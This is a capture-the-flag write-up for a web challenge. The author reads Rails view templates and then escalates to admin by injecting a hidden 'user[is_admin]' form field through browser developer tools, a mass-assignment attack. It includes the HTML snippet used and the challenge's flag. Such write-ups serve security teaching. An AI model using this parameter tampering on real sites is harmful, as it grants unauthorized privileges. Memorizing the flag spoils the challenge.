Zach: Massive Fail (120 pts)

After downloading the source and pursuing it, I found two largely interesting files:

views/user/create.html.erb:
```
<h1>Registration Complete!</h1>
<h3>Welcome <%= @new_user.name %>!</h3>
<% if (@new_user.is_admin) then %>
  <p>You're an admin, so you get to know the secret code: <b>flag removed</b></p>
<% else %>
  <p>You're not an administrator so you get no secrets.</p>
<% end %>
```

views/user/register.html.erb:
```
<h1>User registration:</h1>

<%= form_for :user, url: "/user/create" do |f| %>
  <div class="control-group">
    <%= f.label :name, class: "control-label" %>:
    <div class="controls">
      <%= f.text_field :name %>
    </div>
  </div>

  <div class="control-group">
    <%= f.label :username, class: "control-label" %>:
    <div class="controls">
      <%= f.text_field :username %>
    </div>
  </div>

  <div class="control-group">
    <%= f.label :password, class: "control-label" %>:
    <div class="controls">
      <%= f.password_field :password %>
    </div>
  </div>
  <br>
  <div class="form-actions">
    <%= f.submit "Register", :class => "btn btn-primary" %>
  </div>
<% end %>
```

From the little bit of ruby and html I do know, I could see this was the instructions for formatting the page for user creation, and the info page that shows up after creation.  Clearly each field (or symbol? is that what they’re called in ruby?) has it’s own control group. And based on the first file, I want to add a field :is_admin with a value of 1 (or true). So I went to the page and opened up developer tools (in chrome). I copied the control group for password, and changed it to work for a field :is_admin, as shown below:
```
<div class="control-group">
    <label class="control-label" for="user_is_admin">Admin</label>:
    <div class="controls">
        <input id="user_is_admin" name="user[is_admin]" size="30" type="text">
    </div>
</div>
```
After entering 1 into that text field, and hitting submit, the following flag was given:
    `no_framework_is_without_sin`
